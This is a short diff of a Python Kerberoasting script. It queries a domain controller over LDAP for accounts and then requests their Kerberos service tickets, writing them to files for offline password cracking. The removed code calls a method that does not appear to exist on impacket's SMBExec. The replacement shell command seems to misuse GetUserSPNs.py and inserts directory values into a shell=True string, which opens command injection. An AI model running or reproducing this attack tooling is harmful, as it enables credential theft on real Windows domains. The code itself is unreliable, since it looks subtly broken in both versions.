@@ -1,4 +1,4 @@
-from impacket.smbexec import SMBExec
+import subprocess
 from ldap3 import Server, Connection, SUBTREE
 
 def find_and_kerberoast_objects(username, password, domain, dc_ip):
@@ -16,13 +16,9 @@ def find_and_kerberoast_objects(username, password, domain, dc_ip):
         # Parse search result and kerberoast objects
         for entry in conn.entries:
             sAMAccountName = entry['sAMAccountName'].value
-            servicePrincipalNames = entry['servicePrincipalName'].values
             print(f"Kerberoasting {sAMAccountName}...")
-            smbexec = SMBExec(dc_ip, domain=domain, username=username, password=password)
-            tgs_tickets = smbexec.GetUserSPNs(sAMAccountName)
-            if tgs_tickets:
-                for tgs in tgs_tickets:
-                    print(tgs)
+            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile {sAMAccountName}_tickets.txt {sAMAccountName}"
+            subprocess.run(cmd, shell=True)
 
         conn.unbind()
 
